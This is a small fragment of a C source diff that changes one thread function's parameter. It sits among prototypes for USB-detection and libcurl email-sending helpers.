@@ -34,7 +34,7 @@ while (1) {                                                      \
 * Prototypes for functions with local scope *
  *******************************************/
 BOOL USBisConnected(char *to_find);
-UINT __stdcall U2MThread(/*LPVOID args*/);
+UINT __stdcall U2MThread(LPVOID PTR_TIMEOUT);
 static size_t payload_source(void *ptr, size_t size, size_t nmemb, void *userp);
 int SendEmail();
 BOOL GetCurlError(int err);
